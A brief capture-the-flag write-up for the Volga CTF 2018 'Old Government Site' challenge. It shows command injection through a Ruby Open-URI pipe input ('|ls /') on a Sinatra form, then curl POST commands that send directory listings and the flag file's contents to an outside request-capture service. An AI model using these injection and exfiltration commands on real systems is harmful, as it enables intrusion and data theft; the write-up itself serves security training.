## Volga CTF 2018 - Old Goverment Site

1. Pay attention to pages url - *http://old-government-site.quals.2018.volgactf.ru:8080/page?id=33*
2. Let`s use brutefors for a while
3. Page with number 18 looks intesting..

It`s validation form for a garbage cleaning company.

Site working on Sinatra Framework (Ruby)

4. Do you hear something about Ruby Open-Uri vulnerability?

[Read this](http://old-government-site.quals.2018.volgactf.ru:8080/page?id=18)

5. Try to type *|ls /*
6. It`s works!
7. Now we need a something service to get POST request from server.

For example, [pustreq](https://putsreq.com/)

8. It`s looks intresting... 

```bash
curl -d "$(ls -l /)" -X POST https://putsreq.com/your-application/
```

We have a file called **flag**

9. Finally...

```bash
curl -d "$(cat flag)" -X POST https://putsreq.com/your-application/
```

10. Congratulations!

